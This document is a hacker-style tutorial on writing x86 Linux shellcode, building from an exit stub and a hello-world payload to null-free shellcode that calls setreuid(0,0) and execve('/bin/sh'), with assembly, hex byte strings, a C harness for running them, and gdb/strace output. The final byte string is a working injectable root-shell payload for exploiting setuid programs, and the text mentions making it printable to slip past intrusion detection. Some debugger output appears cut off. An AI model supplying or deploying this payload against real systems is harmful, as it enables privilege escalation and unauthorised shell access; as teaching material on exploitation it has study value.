----[ Introduction to writing shellcode.

Shellcode is machine code that when executed spawns a shell, sometimes. 
Shellcode cannot have any null's in it because it is (usually) treated as a C 
string and a null will stop the reading of the string, as it is the string 
delimiter. Not all "shellcode" spawns a shell, this has become a more generic 
name for a bit of position independant machine readable code that can be directly 
executed by the cpu. Shellcode must always be position independant - you cannot 
access any values through static addresses, as these address will not be static 
in the program that is executing your shellcode - environment variables are the 
execption to this rule. Remember to always use the smallest part of a register
possible to avoid null's, and xor is your friend.

To test out the shellcode we will be using this C prog:

char shellcode[] = "";             /* global array */
int
main (int argc, char **argv)
{
        int (*ret)();              /* ret is a function pointer */
        ret = (int(*)())shellcode; /* ret points to our shellcode */
                                   /* shellcode is type caste as a function */
        (int)(*ret)();             /* execute, as a function, shellcode[] */
        exit(0);                   /* exit() */
}

Start off with a simple one, just exit.

entropy@phalaris {~/asm/shellcode} cat exit.s

.globl _start
_start:
   xor %eax, %eax   # xor anything with itself is 0, so %eax = 0
   movb $1, %al     # move byte 1 into al(a low), eax contains syscall number
   xor %ebx, %ebx   # set ebx to 0, ebx contains return value
   int $0x80        # call kernel

Assemble.

What we are concerned with here is the machine code, so lets make a string 
out of it, it should look like this on my box:

   "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"

And put that into out test code so it looks like:

char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
int
main (int argc, char **argv)
{
        int (*ret)();              /* ret is a function pointer */
        ret = (int(*)())shellcode; /* ret points to our shellcode */
                                   /* shellcode is type casted as a function */
        (int)(*ret)();             /* execute as function shellcode[] */
        /*exit(0);*/                   /* exit() */
}

Notice that I commented out the exit(0); as the shellcode will be preforming that
for us. Compile and run.

entropy@phalaris {~/asm/shellcode} gcc exit_test.c -o exit_test

entropy@phalaris {~/asm/shellcode} ./exit_test

entropy@phalaris {~/asm/shellcode} echo $?
0

So it looks like it executed correctly but how to be sure? We can strace it to see 
what syscall's it executing and look for exit or we can strp through it with gdb, 
we'll try both.

entropy@phalaris {~/asm/shellcode} strace ./exit_test

execve("./exit_test", ["./exit_test"], [/* 44 vars */]) = 0

_exit(0)                                = ?

Here we can see the first syscall execve executing out program, followed by 
the opening of the dynamic linker/loader ld.so (first preload then cache) to 
load shared libraries, followed by the opening of libc, followed by its 
idenitifcation as an ELF file ("\177ELF"), followed by our programing being 
memory mapped, and finally our call to exit.

And for gdb recompile with debugging symbols.

0x08049566 <shellcode+10>:      add    %al,(%eax)
End of assembler dump.

At line: <main+16>:   movl   $0x804955c,0xfffffffc(%ebp), the address of our 
shellcode is being put into the local variable -4(%ebp) (remeber that local 
variables are always subtracted from ebp and that 0xfffffffc = -4 in 2's 
complement). Then on the next line <main+23>:   mov    0xfffffffc(%ebp),%eax, 
that address is being put into %eax, and following <main+26>:   call   *%eax, 
our shellcode is called to execute. If you look at the disassembly of shellcode 
((gdb) disas shellcode) you will see that up until instruction <shellcode+6> that 
is our assembly we had for exit, so you can be sure that it is executing exit().

Now some shellcode to print a string, this is going to be more complex as now we 
have to know the issues in creating our shellcode.

1) You can not have nulls in your shellcode.
2) You can not use static addresses in your shellcode.

Ok so if we have a string, say its "Hello, World\n", in our shellcode and we 
cannot use static addresses how can we possibly get the address of the string 
to write? If you remember that what the instruction call does, call pushes the 
next value following it (the return value normally) onto the stack then transfers 
control to the symbol following call. So if we put the address of our string 
directly after a call instruction, when call has transfered control to the symbol
following it the address of our string will be on the top of the stack and we 
can just pop it off. Thats what we'll do. Also remeber that anything xor'ed
with itself is going to be 0 so its a good way to get something 0 without a 
movl $0, %reg. Ok we are going to need a write, and an exit so lets get the 
syscall number and the function definition of these.

entropy@phalaris {~/asm/shellcode} man 2 write

[...snip...]

ssize_t write(int fd, const void *buf, size_t count);

[...snip...]

write() takes the file descriptor to write to (we'll use STDOUT 1), an address 
of the string to write, and its length.

entropy@phalaris {~/asm/shellcode} grep __NR_write /usr/include/asm/unistd.h
#define __NR_write                4

And the write() syscall number is 4, and for exit...

entropy@phalaris {~/asm/shellcode} man 2 exit

[...snip...]

void _exit(int status);

[...snip...]

exit() just takes the exit status, we use 0 for no errors.

entropy@phalaris {~/asm/shellcode} grep __NR_exit /usr/include/asm/unistd.h
#define __NR_exit                 1

And exit() syscall number is 1.

Lets check out the assembly.

entropy@phalaris {~/asm/shellcode} cat hello.s

.globl _start
_start:
   jmp do_call    # 1. jump down and do a call to get the address
jmp_back:         # 4. the call transfered control here
   xor %eax, %eax # 5. set eax to 0
   xor %ebx, %ebx # 6. set ebx to 0
   xor %ecx, %ecx # 7. set ecx to 0
   xor %edx, %edx # 8. set edx to 0
   movb $4, %al   # 9. 4 is syscall number for write(int fd,char *str, int len)
   movb $14, %dl  # 10. put 14 into dl(d low) its the string length
   popl %ecx      # 11. pop the adrress off the stack, which is the string addr
   movb $1, %bl   # 12. put 1 into bl(b low), its the fd to write to STDOUT
   int $0x80      # 13. call the kernel
   xor %eax, %eax # 14. set eax to 0
   movb $1, %al   # 15. 1 is syscall number for exit
   xor %ebx, %ebx # 16. set ebx to 0, its the return value
   int $0x80      # 17. call kernel
do_call:          # 2. about to execute the call, notice hello: symbol following
   call jmp_back  # 3. now we have the address of hello on the stack jmp_back
hello:
   .ascii "Hello, World!\n"

So assemble, link and disassemble it.

The assembly is all pretty understandable until you get down to the <hello>
symbol, but if you take a look at an extended ascii chart it will be much clearer. 
48 hex is, if you notice, a capital 'H', 65 hex is and 'e', 6c is an 'l' .... 
these hex chars are also machine code, they are just being interpereted differently. 
For example '31' can be interperted many different ways depending on how the 
programmer is representing it, if printing it out so as to represent it as a 
printable character as in printf("%c\n", 0x31); it print's '1' because as you 
can see the char '1' in hex according to the ascii chart is 31. If it is an 
opcode as in our disassembly above  "31 c0                   xor    %eax,%eax" 
31 is the machine code for the instruction 'xor'. Its important to rememeber this. 
So the assembly following the <hello> symbol is really:

H  e  l  l  o  ,     W  o  r  l  d  !  \n
48 65 6c 6c 6f 2c 20 57 6f 72 6c 64 21 0a

Create the shellcode string from the disassembly, I have:

eb 19 31 c0 31 db 31 c9 31 d2 b0 04 b2 0e 59 b3 01
cd 80 31 c0 b0 01 31 db cd 80 e8 e2 ff ff ff 48 65
6c 6c 6f 2c 20 57 6f 72 6c 64 21 0a

And make a C string out of it, hex chars need a '\x' in front of them:

"\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb2\x0e\x59\xb3\x01
\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65
\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a"

Put it in a test file, compile and run it.

End of assembler dump.

Here again we can see our jump to the call "jmp    0x80495db <shellcode+27>", 
and call pushes the next address which is 0x080495e0 (the start of our string) 
and jumps back to address 0x80495c2 which is "<shellcode+2>:  xor    %eax,%eax", 
and we now have the address we want on the top of the stack.

So how about some real shellcode. First were goign to have to call setreuid() 
it 0 incase the program we are exploiting drops privs. Next we are going to 
have to call execve() to execute the shell namely /bin/sh. Again we need the 
syscall number and function parameters to both of these functions.

entropy@phalaris {~/asm/shellcode} man 2 setreuid

[...snip...]

int setreuid(uid_t ruid, uid_t euid);

[...snip...]

entropy@phalaris {~/asm/shellcode} grep __NR_setreuid /usr/include/asm/unistd.h
#define __NR_setreuid            70

Well this one is simple enough, just something like

   xor %eax, %eax  # clear out eax
   movb $70, %al   # mov 70 int al
   xor %ecx, %ecx  # set ecx to 0, which is the uid_t euid (effective userid)
   xor %ebx, %ebx  # set ebx to 0, which is the uid_t ruid (real userid)
   int $0x80       # call kernel

That ones easy. Now for execve.

entropy@phalaris {~/asm/shellcode} man 2 execve

[...snip...]

int execve(const char *filename, char *const argv [], char *const envp[]);

[...snip...]

Fun times, two char ** arguments.

entropy@phalaris {~/asm/shellcode} grep __NR_execv* /usr/include/asm/unistd.h
#define __NR_execve              11

Ok this ones a little harder. So were going to need a null terminated string, 
the address of the string and a * null pointer in adjacent memory, that should 
look something like:

   execve("/bin/sh", *"/bin/sh", (char **)NULL);

And in memory /bin/shNXXXXYYYY where /bin/sh is our null terminated string 
(we must replace N with '\0'), XXXX (4 bytes) is the address of the address 
of our string, and YYYY (4 bytes) is the address of the envp[] pointer( which we are 
goign to call with *NULL). When we are all set to go %eax should have 11 in it, %ebx 
should have the string address in it, %ecx should have the address of %ebx in it 
and %edx should have the address of the (char **)NULL string in it.

So lets code this, I ended up with this:

.globl _start
_start:
   # our setreuid(0,0) call
   xor %eax, %eax    # clear out eax
   movb $70, %al     # mov 70 int al
   xor %ecx, %ecx    # set ecx to 0, which is the uid_t euid (effective userid)
   xor %ebx, %ebx    # set ebx to 0, which is the uid_t ruid (real userid)
   int $0x80         # call kernel
   # go get the address with the call trick
   jmp do_call
jmp_back:
   pop %ebx            # ebx has the address of our string, use it to index
   xor %eax, %eax      # set eax to 0
   movb %al, 7(%ebx)   # put a null at the N aka shell[7]
   movl %ebx, 8(%ebx)  # put the address of our string (in ebx) into shell[8]
   movl %eax, 12(%ebx) # put the null at shell[12]
   # our string now looks like "/bin/sh\0(*ebx)(*0000)" which is what we want.
   xor %eax, %eax      # clear out eax
   movb $11, %al       # put 11 which is execve syscall number into al
   leal 8(%ebx), %ecx  # put the address of XXXX aka (*ebx) into ecx
   leal 12(%ebx), %edx # put the address of YYYY aka (*0000) into edx
   int $0x80           # call kernel
do_call:
   call jmp_back
shell:
   .ascii "/bin/shNXXXXYYYY"

entropy@phalaris {~/asm/shellcode} ld shell.o -o shell

entropy@phalaris {~/asm/shellcode} ./shell
Segmentation fault

Thats odd, the code looks to be correct? Lets step through it, in order to 
break at _start with gdb we have to temporarily put a nop after the _start: 
label and assemble with -g.

entropy@phalaris {~/asm/shellcode} cat shell.s

.globl _start
_start:
   # our setreuid(0,0) call
   nop
   xor %eax, %eax    # clear out eax

   jmp do_call

Here is the problem our shell string is in the .text or code section that is 
marked read only, as seen above:

Ok much better now our shell string is in the data section
   080490bd l       .data  00000000 shell

The .data section is not marked read only.

1 .data         00000039  08049094  08049094  00000094  2**2
                  CONTENTS, ALLOC, LOAD, DATA

And try out he shell.

entropy@phalaris {~/asm/shellcode} ./shell

sh-2.05b$ exit
exit

So that works, now that we have all our code in the .data section to get 
our machine code we need to use the -D. First reassemble and link without 
debugging info.

entropy@phalaris {~/asm/shellcode} as shell.s -o shell.o

entropy@phalaris {~/asm/shellcode} ld shell.o -o shell

chown and u+s it to make sure it wont drop privs.

entropy@phalaris {~/asm/shellcode} sudo chown root shell

entropy@phalaris {~/asm/shellcode} sudo chmod 4750 shell

entropy@phalaris {~/asm/shellcode} ls -la shell

The machine code I get is:

31 c0 b0 46 31 c9 31 db cd 80 eb 18 5b 31 c0 88 43 07 
89 5b 08 89 43 0c 31 c0 b0 0b 8d 4b 08 8d 53 0c cd 80 
e8 e3 ff ff ff 2f 62 69 6e 2f 73 68 4e 58 58 58 58 59 
59 59 59

We no longer need the NXXXXYYYY after /bin/sh as that was just to 
make it easier on us and to reserve space, remove that end end up with:

31 c0 b0 46 31 c9 31 db cd 80 eb 18 5b 31 c0 88 43 07 
89 5b 08 89 43 0c 31 c0 b0 0b 8d 4b 08 8d 53 0c cd 80 
e8 e3 ff ff ff 2f 62 69 6e 2f 73 68

Now we have the code that can be injected, lets try it on our test.

entropy@phalaris {~/asm/shellcode} cat shell_test.c

char shellcode[] = "\x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b"\
                   "\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0"\
                   "\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff"\
                   "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
int
main (int argc, char **argv)
{
        int (*ret)();              /* ret is a function pointer */
        ret = (int(*)())shellcode; /* ret points to our shellcode */
                                   /* shellcode is type casted as a function */
        (int)(*ret)();             /* execute as function shellcode[] */
        exit(0);                   /* exit() */
}

entropy@phalaris {~/asm/shellcode} gcc shell_test.c -o shell_test

entropy@phalaris {~/asm/shellcode} sudo chown root shell_test

entropy@phalaris {~/asm/shellcode} sudo chmod 4750 shell_test

exit

entropy@phalaris {~/asm/shellcode} rm shell_test
rm: remove write-protected regular file `shell_test'? y

Theres many ways to make this shell code smaller, and with shellcode the 
smaller the better. You can also make this shellcode consist of printable 
characters only, so it can slip through IDS and filters, but I'll save 
this for another time.
